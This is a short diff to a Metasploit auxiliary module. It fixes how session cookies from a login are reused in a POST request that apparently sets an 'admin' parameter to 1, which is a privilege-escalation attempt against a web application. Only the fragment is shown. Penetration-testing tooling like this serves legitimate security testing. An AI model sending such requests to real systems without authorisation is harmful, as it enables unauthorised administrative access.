@@ -50,12 +50,17 @@ class MetasploitModule < Msf::Auxiliary
         print_line("LOGIN: SUCCESS")
       end
 
+      cookies = res.get_cookies
+      if cookies.empty?
+        print_error("No session cookie received")
+        return
+      end
       print_status("Sending request to #{target_path}...")
 
       res = send_request_cgi({
         "uri" => target_path,
         "method" => "POST",
-        "cookie" => session_cookies,
+        "cookie" => cookies,
         "vars_post" => {
           "username" => "user",
           "admin" => "1",
